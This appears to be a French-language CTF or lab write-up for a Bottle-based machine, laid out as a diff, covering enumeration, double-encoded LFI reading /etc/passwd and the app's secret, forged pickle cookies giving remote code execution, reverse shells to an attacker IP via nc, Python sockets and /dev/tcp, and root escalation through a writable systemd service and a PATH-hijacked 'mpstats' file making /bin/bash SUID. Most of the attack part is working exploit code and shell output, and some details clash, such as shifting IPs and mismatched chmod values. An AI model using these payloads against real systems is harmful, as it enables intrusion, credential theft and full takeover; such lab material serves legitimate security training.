@@ -1,0 +1,574 @@
+#Enumération :
+
+nmap -sV $IP
+ 
+  8080 WSGI server
+ 
+We go on : http://IP:8080 and we see newspapper
+ 
+2 buttom : Page hello guest & subscribe
+ 
+Now we try to search some file : dirsearch -u http://192.168.56.246:8080
+ 
+install seclists
+ 
+gobuster dir -u http://192.168.56.246:8080/ -w /usr/share/seclists….
+ 
+We find /view 200
+  
+See more → Page 
+ 
+/view?page=views/2.html
+ 
+go testing LFI 
+ 
+https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt
+ 
+wfuzz -c --hh=32 -z file,LFI\ payloads.txt http://192.168.160.246:8080/view?page=FUZZ
+ 
+curl -i "[http://192.168.60.246:8080/view?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd"](http://192.168.60.246:8080/view?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd%22)  
+ 
+we see /etc/passwd
+ 
+wesee on user
+ 
+hcue:x:1000:1000::/home/hcue:/bin/sh 
+ 
+pivot classique en CTF/OSCP pour récupérer rapidement .env, configs, clés, etc., proc/self/cwd pour lire directement les fichiers de l’appli (project root), et vise l’utilisateur hcue pour tenter un accès.
+ 
+curl -s "http://192.168.52.246:8080/view?page=%252e%252e%252f%252e%252e%252f/proc/self/cmdline" --output -
+
+On trouve une page html CodePen avec une section qui appelle une l'app.py de bottle en python 
+<section class="container">
+<p>/usr/bin/python3/opt/bottle-blog/app.py</p>
+</section>
+
+Regardons ce que contient le app.py
+curl -s "http://192.168.52.246:8080/view?page=%252e%252e%252f%252e%252e%252f/opt/bottle-blog/app.py" --output -
+
+Contient une page qui fait des appel à une bdd bottle et configurer un secret, cela ressemble à une récupération de cookie pour initier une session
+Le secret est récupéré via from config.server import secret
+ 
+curl -s "http://192.168.60.246:8080/view?page=%252e%252e%252f%252e%252e%252f/opt/bottle-blog/config/secret.py" --output -
+ 
+<p>secret = &quot;546546DSQ7711DSQDSQXWZ&quot;</p>
+
+Nous essayons de générer un cookie pour un admin sur le serveur, app.py indique :
+
+if (not session):
+        session={'name':'guest'}
+        response.set_cookie("name",session,secret=secret)
+
+On va reprendre ce code et modifier name = admin en réutilisant le secret.
+
+A la fin du code, nous avons un run sur un localhost avec un port 8080 donc il faudra récupérer la génération du cookie avec un curl http://localhost:8080 -I
+
+création de cookie.py
+
+from bottle import route, run, static_file, template, request, response, error
+from config.secret import secret
+import os
+import urllib
+import re
+
+@route("/")
+def home():
+    session = request.get_cookie('name', secret=secret)
+    if not session:
+        session = {"name": "guest"}
+        response.set_cookie('name', session, secret=secret)
+
+    return template('index', name=session['name'])
+
+@route('/static/js/<filename>')
+def server_static_js(filename):
+    return static_file(filename, root=os.getcwd() + '/views/js/')
+
+@route('/static/css/<filename>')
+def server_static_css(filename):
+    return static_file(filename, root=os.getcwd() + '/views/css/')
+
+@route("/view", methods=['GET'])
+def view():
+    try:
+        # Avoiding URL Encoding 
+        # Fix added after the report from our security team
+        # Added by Developer bob
+        page = urllib.parse.unquote(request.query_string.split("=")[1])
+    except:
+        page = ""
+    if page == "":
+        return template("error.html", error="Error! Page Parameter empty!")
+    # Avoiding leaking code source or config
+    elif page.startswith("app.py") or page.startswith("config"):
+        return template("error.html", error="You can't view this page!")
+    # Avoiding directory traversal
+    if ('../' not in page) and ('./' not in page):
+        # Enforcing URL Encoding
+        # Added by Intern Max
+        page = urllib.parse.unquote(page)
+        p = "404"
+        if os.path.isfile(os.getcwd() + '/' + page):
+            with open(os.getcwd() + '/' + page, "r") as f:
+                p = f.read()
+        else:
+            return template("error.html", error="Page not found!")
+    return template("blog.html", read=p)
+
+@error(404)
+def error404(error):
+    return template('error.html', error='404 not found')
+
+if __name__ == '__main__':
+    run(host='0.0.0.0', port=8080)
+
+Comprendre le code : 
+
+# Déclare la route HTTP GET pour la page d'accueil "/"
+# Récupère le cookie signé 'name'
+# Si le cookie n'existe pas ou est invalide
+# Définit une session par défaut
+# Renvoie un cookie signé au client
+# Rend le template 'index' avec la variable 'name'
+# Sert le fichier depuis ./views/js/
+@route("/view", methods=['GET'])  # Route GET pour afficher le contenu d'un fichier
+
+Nous allons tenter de forger un cookie avec name=admin et le secret identifié dans secret.py 
+
+cookie.py : 
+
+from bottle import route, run, static_file, template, request, response, error
+secret = "546546DSQ7711DSQDSQXWZ"
+import os
+import urllib
+import re
+
+@route("/")
+def home():
+    session = request.get_cookie('name', secret=secret)
+    if not session:
+        session = {"name": "admin"}
+        response.set_cookie('name', session, secret=secret)
+    return template('index', name=session['name'])
+
+@route('/static/js/<filename>')
+def server_static_js(filename):
+    return static_file(filename, root=os.getcwd() + '/views/js/')
+
+@route('/static/css/<filename>')
+def server_static_css(filename):
+    return static_file(filename, root=os.getcwd() + '/views/css/')
+
+@route("/view", methods=['GET'])
+def view():
+    try:
+        page = urllib.parse.unquote(request.query_string.split("=")[1])
+    except:
+        page = ""
+    if page == "":
+        return template("error.html", error="Error! Page Parameter empty!")
+    elif page.startswith("app.py") or page.startswith("config"):
+        return template("error.html", error="You can't view this page!")
+    if ('../' not in page) and ('./' not in page):
+        page = urllib.parse.unquote(page)
+        p = "404"
+        path = os.path.join(os.getcwd(), page)
+        if os.path.isfile(path):
+            with open(path, "r", encoding="utf-8") as f:
+                p = f.read()
+        else:
+            return template("error.html", error="Page not found!")
+    return template("blog.html", read=p)
+
+@error(404)
+def error404(error):
+    return template('error.html', error='404 not found')
+
+if __name__ == '__main__':
+    run(host='0.0.0.0', port=8080)
+
+puis : 
+
+Crée un fichier views/index.tpl qui utilise la variable name passée par le contrôleur. car l’appel template('index', ...) de Bottle cherche automatiquement un fichier de template nommé index.tpl dans le dossier views/ 
+
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8">
+  <title>Accueil</title>
+  <link rel="stylesheet" href="/static/css/style.css">
+</head>
+<body>
+  <h1>Bienvenue, {{name}}</h1>
+
+  <script src="/static/js/app.js"></script>
+</body>
+</html>
+
+python3 cookie.py 
+
+url http://localhost:8080 -I
+HTTP/1.0 200 OK
+Date: Mon, 03 Nov 2025 10:11:51 GMT
+Server: WSGIServer/0.2 CPython/3.13.5
+Content-Length: 249
+Content-Type: text/html; charset=UTF-8
+Set-Cookie: name="!cqzPse4KAx3hWnZWvMKZSh6TNrqVY5diBAOZ3M9qLbg=?gAWVGQAAAAAAAABdlCiMBG5hbWWUfZRoAYwFYWRtaW6Uc2Uu"
+
+Nous avons ce cookie admin : !cqzPse4KAx3hWnZWvMKZSh6TNrqVY5diBAOZ3M9qLbg=?gAWVGQAAAAAAAABdlCiMBG5hbWWUfZRoAYwFYWRtaW6Uc2Uu
+
+On va le réinjecté dans la page web : inspecter > stockage > modif cookie
+
+ok c'était un trap.. xD ça ne donne rien
+
+Recommençons, comprennon ce que fait bottle :
+
+Bottle est un micro‑framework web pour Python, ultra‑léger et contenu dans un seul fichier. Il implémente WSGI, fournit un routeur, un moteur de templates minimal (SimpleTemplate), la gestion des requêtes/réponses, des fichiers statiques et un petit serveur de développement. Il est pensé pour des apps simples, des services embarqués ou des exercices CTF, avec très peu de dépendances, un peu comme Flask mais encore plus minimaliste.
+Son fonctionnement est direct : tu définis des routes avec des décorateurs, tu renvoies du texte ou tu rends un template, et tu peux lire/écrire des cookies.
+Pickle est le mécanisme natif de Python pour sérialiser des objets en un flux d’octets, puis les reconstruire. 
+La sérialisation transforme un graphe d’objets Python (listes, dicts, instances, etc.) en bytes via des “opcodes” propres à Python, et la désérialisation rejoue ces opcodes pour recréer les objets à l’identique.
+Bottle sérialise alors l’objet avec pickle et place ces octets (encodés en base64) dans le cookie.
+À la lecture, request.get_cookie('name', secret=...) vérifie la signature HMAC du cookie et “dé-pickle” pour recréer l’objet.
+Si le secret est connu, un attaquant peut forger un pickle malveillant dont __reduce__ exécute du code au moment de la désérialisation, entraînant une exécution de commande côté serveur.
+
+Notre appli Python Bottle  stocke des objets Python dans un cookie “signé”.
+
+Ce que l'on doit faire pour faire notre RCE :
+
+Le code commence par récupérer la clé secrète utilisée par Bottle pour signer les cookies (via fuite/LFI en lisant le code ou la config),
+puis explique le format des cookies de Bottle (!<signature>?<payload>) où le payload est un pickle en base64 et la signature un HMAC avec le secret.
+En connaissant ce secret, il fabrique un cookie sur mesure: un pickle malveillant dont __reduce__ exécute une commande au moment de la désérialisation.
+Il envoie ce cookie sur une route qui fait request.get_cookie(..., secret=secret), ce qui déclenche l’unpickling côté serveur, lui donnant RCE.
+                                                                                                                
+# test.py ? valide l'exécution (écrit /tmp/pwned)
+import base64, hashlib, pickle, hmac, os
+SECRET = b"546546DSQ7711DSQDSQXWZ"
+
+class T:
+    def __reduce__(self):
+        return (os.system, ('id > /tmp/pwned',))
+
+payload = base64.b64encode(pickle.dumps(T(), protocol=4)).decode()
+sig = base64.b64encode(hmac.new(SECRET, payload.encode(), hashlib.md5).digest()).decode()
+print(f"!{sig}?{payload}")
+
+curl -s -H 'Cookie: name='"$(python3 test.py)" http://192.168.67.246:8080/     
+
+curl "http://192.168.67.246:8080/view?page=%252e%252e%252f%252e%252e%252f/tmp/pwned"
+
+
+rce.py
+import base64, hashlib, pickle, hmac, os
+
+SECRET = b"546546DSQ7711DSQDSQXWZ"
+ATTACKER_IP = "192.168.67.246"
+ATTACKER_PORT = 6666
+
+cmd = (
+    "python3 -c 'import os,pty,socket;"
+    f"s=socket.socket(); s.connect((\"{ATTACKER_IP}\",{ATTACKER_PORT}));"
+    "[os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(\"/bin/bash\")'"
+)
+
+# Exécute la commande, puis retourne un dict attendu par la vue
+expr = f"(__import__('os').system({cmd!r}), {{'name':'admin'}})[1]"
+
+class RCE:
+    def __reduce__(self):
+        return (eval, (expr,))
+
+payload = base64.b64encode(pickle.dumps(RCE(), protocol=4)).decode()
+sig = base64.b64encode(hmac.new(SECRET, payload.encode(), hashlib.md5).digest()).decode()
+print(f"!{sig}?{payload}")
+
+nc -lvnp 6666
+
+ça ne focntionne tjr pas ..
+
+Ton snippet fabrique un cookie Bottle au format !<signature>?<payload> où:
+
+- payload est un pickle d’un objet dont __reduce__ appelle exec(code) (exécute ton reverse),
+- signature est un HMAC calculé sur le payload avec le secret de l’app et, dans ton cas, en MD5.
+
+# rce.py
+import base64, hashlib, pickle, hmac, os
+
+secret = b"546546DSQ7711DSQDSQXWZ"  # bytes
+code = (
+    "import os\n"
+    "os.system('rm -f /tmp/f; mkfifo /tmp/f; "
+    "cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.67.246 6666 >/tmp/f')"
+)
+
+class RCE:
+    def __reduce__(self):
+        return (exec, (code,))
+
+payload = base64.b64encode(pickle.dumps(RCE(), protocol=4)).decode()
+sig = base64.b64encode(hmac.new(secret, payload.encode(), hashlib.md5).digest()).decode()
+print(f"!{sig}?{payload}")
+
+J'ai un response 200 mais rien coté nc
+
+# forge_cookie_rce_md5.py — exécute un reverse Python et retourne {'name':'admin'}
+import base64, hashlib, pickle, hmac
+
+SECRET = b"546546DSQ7711DSQDSQXWZ"
+ATTACKER_IP = "192.168.67.246"   # ton IP "src" vers 192.168.60.246 (vérifie: ip route get 192.168.60.246)
+ATTACKER_PORT = 443              # 443/80 passent souvent mieux
+
+cmd = (
+    "python3 -c 'import os,pty,socket;"
+    f"s=socket.socket(); s.connect((\"{ATTACKER_IP}\",{ATTACKER_PORT}));"
+    "[os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(\"/bin/bash\")'"
+)
+
+expr = f"(__import__('os').system({cmd!r}), {{'name':'admin'}})[1]"
+
+class RCE:
+    def __reduce__(self):
+        return (eval, (expr,))
+
+payload = base64.b64encode(pickle.dumps(RCE(), protocol=4)).decode()
+sig = base64.b64encode(hmac.new(SECRET, payload.encode(), hashlib.md5).digest()).decode()
+print(f"!{sig}?{payload}")
+
+Débrief du jour : 
+On est parti d’un ffuf sur le paramètre page et on a validé une LFI via double‑encodage (%252e%252e%252f), ce qui nous a permis de lire des fichiers sensibles (/etc/passwd, présence de l’utilisateur hcue) et, surtout, d’accéder au code de l’appli via /proc/self/cwd. En lisant l’app Bottle, on a compris le lien critique entre Bottle et pickle: la session est stockée dans un cookie signé (!signature?payload) qui contient un objet picklé. Si on connaît le secret, on peut forger un cookie dont le __reduce__ exécute du code à la désérialisation.
+On a également identifié que la cible signe en HMAC‑MD5 (et non SHA‑256), en se basant sur la longueur de la signature renvoyée dans Set‑Cookie.
+
+Côté exploitation, on a forgé des cookies valides (MD5) et prouvé l’exécution avec un marqueur (id > /tmp/pwned lu via la LFI).
+On a aussi vu pourquoi certains payloads provoquaient des 500: ta vue fait session['name'], donc si l’unpickle renvoie un entier (retour de os.system) au lieu d’un dict, ça casse.
+Le payload basé sur exec retourne None, ce qui déclenche la branche qui remet un dict par défaut et évite le 500, tout en exécutant la commande.
+
+Où on en est :
+Le cookie malveillant est accepté (200) et l’exécution côté serveur est confirmée.
+Le reverse shell n’a pas “pop” de façon fiable, probablement à cause de l’égresse (port/IP) ou du binaire nc côté cible. La mécanique RCE est bien en place; le blocage est réseau/outil.
+
+Ce qu’on teste demain :
+Un reverse Python via exec (sans dépendance nc), avec l’IP “src” correcte vers la cible et un port typiquement autorisé (443 ou 80), déclenché sur la route / qui lit le cookie. Vérifie ton IP avec ip route get 192.168.X.246 et adapte le port si besoin.
+Si ça ne sort toujours pas, un “callback” HTTP minimal (curl vers ton serveur HTTP) pour valider l’égresse, puis ajuster port/IP.
+En parallèle, continuer l’énumération via LFI: variables d’environnement (/proc/self/environ), commande lancée (/proc/self/cmdline), configs de l’appli et secrets dans /proc/self/cwd (.env, config/*, templates), et logs utiles.
+Dès qu’on a un shell, on bascule sur l’énumération locale et la privesc (sudo -l, SUID/caps, cron, chemins).
+
+
+
+
+# exploit_cookie_md5.py
+import os, hmac, hashlib, base64, pickle, requests
+
+def tob(s, enc='utf8'):
+    if isinstance(s, str):
+        return s.encode(enc)
+    return b'' if s is None else bytes(s)
+
+def touni(s, enc='utf8', err='strict'):
+    if isinstance(s, bytes):
+        return s.decode(enc, err)
+    return str("" if s is None else s)
+
+def create_cookie(name, value, secret):
+    # Format compatible Bottle: pickle de [cookie_name, value], puis HMAC-MD5 sur le payload base64
+    d = pickle.dumps([name, value], -1)
+    encoded = base64.b64encode(d)
+    sig = base64.b64encode(hmac.new(tob(secret), encoded, digestmod=hashlib.md5).digest())
+    return touni(tob('!') + sig + tob('?') + encoded)
+
+class PickleRCE:
+    def __init__(self, cmd):
+        self.cmd = cmd
+    def __reduce__(self):
+        code = f"""
+from bottle import response
+import subprocess,base64
+out = subprocess.check_output({self.cmd!r}, shell=True)
+response.set_header('X-Res', base64.b64encode(out))
+"""
+        return (exec, (code,))
+
+# Paramètres à adapter
+SECRET = "546546DSQ7711DSQDSQXWZ"
+TARGET = "http://192.168.66.246:8080/"   # route qui lit le cookie
+CMD    = "id"                             # ex: 'id', 'uname -a', 'ls -la /home/hcue/local.txt, bash -c "/bin/sh -i >& /dev/tcp/MONIP/6666 0>&1", "bash -c 'bash -i >& /dev/tcp/MONIP/6666 0>&1'"  '
+
+# Construction du cookie et requête
+session = {"name": PickleRCE(CMD)}
+cookie = create_cookie("name", session, SECRET)
+
+r = requests.get(TARGET, cookies={"name": cookie})
+print("HTTP:", r.status_code)
+hdr = r.headers.get("X-Res") or r.headers.get("x-res")
+if hdr:
+    print(base64.b64decode(hdr).decode("utf-8", errors="ignore"))
+else:
+    print("Aucun en-tête X-Res reçu (commande exécutée mais pas d’output, ou cookie refusé).")
+
+
+(root?kali)-[/home/kali]
+# nc -lvnp 6666
+listening on [any] 6666 ...
+connect to [192.168.49.66] from (UNKNOWN) [192.168.66.246] 33600
+bash: cannot set terminal process group (923): Inappropriate ioctl for device
+bash: no job control in this shell
+hcue@BottleUp:/opt/bottle-blog$ 
+
+cd /home/hcue
+cat local.txt
+
+XXXXXXXXXXXXXXXXXXXXXXXXXXXX
+
+hcue@BottleUp:/tmp$ git clone https://github.com/BRU1S3R/linpeas.sh.git
+git clone https://github.com/BRU1S3R/linpeas.sh.git
+Cloning into 'linpeas.sh'...
+hcue@BottleUp:/tmp$ ls
+ls
+linpeas.sh
+snap-private-tmp
+systemd-private-abfa40b13ac1422b955087a248dbefbc-fwupd.service-CMZuDh
+systemd-private-abfa40b13ac1422b955087a248dbefbc-ModemManager.service-NmBoXh
+systemd-private-abfa40b13ac1422b955087a248dbefbc-systemd-logind.service-kVxA9e
+systemd-private-abfa40b13ac1422b955087a248dbefbc-systemd-resolved.service-yKQbah
+systemd-private-abfa40b13ac1422b955087a248dbefbc-systemd-timesyncd.service-Nps3Eh
+systemd-private-abfa40b13ac1422b955087a248dbefbc-upower.service-9xVFPf
+vmware-root_748-2966037996
+hcue@BottleUp:/tmp$ chmod +x linpeas.sh 
+chmod +x linpeas.sh
+hcue@BottleUp:/tmp$ ./linpeas.sh
+
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses                                                                                                                                                        
+/usr/bin:/usr/local/bin:/home/hcue:/home/root                                                                                                                                                                                               
+New path exported: /usr/bin:/usr/local/bin:/home/hcue:/home/root:/usr/local/sbin:/usr/sbin:/sbin:/bin
+
+You have write privileges over /etc/systemd/system/app.service                                                                                                                                                                              
+/etc/systemd/system/larj.service
+
+/etc/systemd/system/app.service
+/etc/systemd/system/larj.service
+/home/hcue
+
+
+Ok, on peut écrire dans des units systemd: /etc/systemd/system/app.service et /etc/systemd/system/larj.service
+Si ces services tournent en root (User= absent ⇒ root par défaut) et si tu peux les recharger/redémarrer, tu obtiens une exécution en root très facilement.
+
+hcue@BottleUp:/tmp/linpeas.sh$ cat /etc/systemd/system/app.service
+cat /etc/systemd/system/app.service
+[Unit]
+Description=APP
+
+[Service]
+ExecStart=python3 /opt/bottle-blog/app.py
+Restart=always
+User=hcue
+Environment=PATH=/usr/bin:/usr/local/bin:/home/hcue:/home/root
+WorkingDirectory=/opt/bottle-blog
+
+[Install]
+WantedBy=multi-user.target
+
+
+hcue@BottleUp:/tmp/linpeas.sh$ cat /etc/systemd/system/larj.service
+cat /etc/systemd/system/larj.service
+[Unit]
+Description=APP
+
+[Service]
+ExecStart=/bin/bash /opt/larj.sh
+Restart=always
+RestartSec=60s
+User=root
+Environment=PATH=/usr/bin:/usr/local/bin:/home/hcue:/home/root
+WorkingDirectory=/opt
+
+[Install]
+WantedBy=multi-user.target
+hcue@BottleUp:/tmp/linpeas.sh$ 
+
+le larj.service est plus intéressant car il tourne en user=root et j'ai des droits d'écriture dessus
+
+hcue@BottleUp:/tmp/linpeas.sh$ systemctl status larj
+systemctl status larj
+? larj.service - APP
+     Loaded: loaded (/etc/systemd/system/larj.service; enabled; vendor preset: enabled)
+     Active: activating (auto-restart) since Tue 2025-11-04 10:57:47 UTC; 17s ago
+    Process: 41062 ExecStart=/bin/bash /opt/larj.sh (code=exited, status=0/SUCCESS)
+   Main PID: 41062 (code=exited, status=0/SUCCESS)
+
+La sortie montre que larj.service lance /bin/bash /opt/larj.sh, qu’il redémarre en boucle, et qu’aucun User= n’est indiqué.
+Cela veut dire que le script est exécuté par root à chaque restart.
+Comme le service redémarre automatiquement, modifier le contenu de /opt/larj.sh suffit: pas besoin de daemon-reload.
+
+le service redémarre tte les 60sc
+
+hcue@BottleUp:/opt$ cat larj.sh
+cat larj.sh
+#!/bin/bash
+
+##### Developed by Intern Team Members - 
+##### 2022-2023 Project
+
+echo -e "
+#####################################################################
+    CPU Health Check Report
+#####################################################################
+ 
+ 
+Hostname         : `hostname`
+Kernel Version   : `uname -r`
+Uptime           : `uptime | sed 's/.*up \([^,]*\), .*/\1/'`
+Last Reboot Time : `who -b | awk '{print $3,$4}'`
+ 
+ 
+ 
+*********************************************************************
+CPU Load - > Threshold < 1 Normal > 1 Caution , > 2 Unhealthy 
+*********************************************************************
+" > /root/status.log
+
+LSCPU=`which lscpu`
+LSCPU=$?
+if [ $LSCPU != 0 ]
+then
+    RESULT=$RESULT" lscpu required to producre acqurate reults"
+else
+cpus=`lscpu | grep -e "^CPU(s):" | cut -f2 -d: | awk '{print $1}'`
+i=0
+while [ $i -lt $cpus ]
+do
+    echo "CPU$i : `mpstats -P ALL | awk -v var=$i '{ if ($3 == var ) print $4 }' `" >> /root/status.log
+    let i=$i+1
+done
+fi
+
+echo -e "
+Load Average   : `uptime | awk -F'load average:' '{ print $2 }' | cut -f1 -d,`
+ 
+Heath Status : `uptime | awk -F'load average:' '{ print $2 }' | cut -f1 -d, | awk '{if ($1 > 2) print "Unhealthy"; else if ($1 > 1) print "Caution"; else print "Normal"}'`
+" >> /root/status.log
+
+
+hcue@BottleUp:/$ /opt/larj.sh
+/opt/larj.sh
+/opt/larj.sh: line 6: /root/status.log: Permission denied
+/opt/larj.sh: line 34: mpstats: command not found
+/opt/larj.sh: line 34: /root/status.log: Permission denied
+/opt/larj.sh: line 34: mpstats: command not found
+/opt/larj.sh: line 34: /root/status.log: Permission denied
+/opt/larj.sh: line 39: /root/status.log: Permission denied
+hcue@BottleUp:/$ 
+
+
+mpstats -> Cette commande tente de mettre les permissions “7777” à la fois sur /bin/bash et sur le répertoire courant
+/opt/larj.sh: line 34: mpstats: command not found -> nous indiques qu'il n'y a pas de fichier ou qu'il y a rien dedans alors que larj.sh l'execute
+Donc il faut écrire le chmod 7777 /bin/bash et créer mpstats
+
+hcue@BottleUp:~$ echo "chmod 4755 /bin/bash" > mpstats
+echo "chmod 7777 /bin/bash" > mpstats
+hcue@BottleUp:~$ /bin/bash -p
+
+cd /root
+ls
+proof.txt
+snap
+status.log
+cat proof.txt
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXX
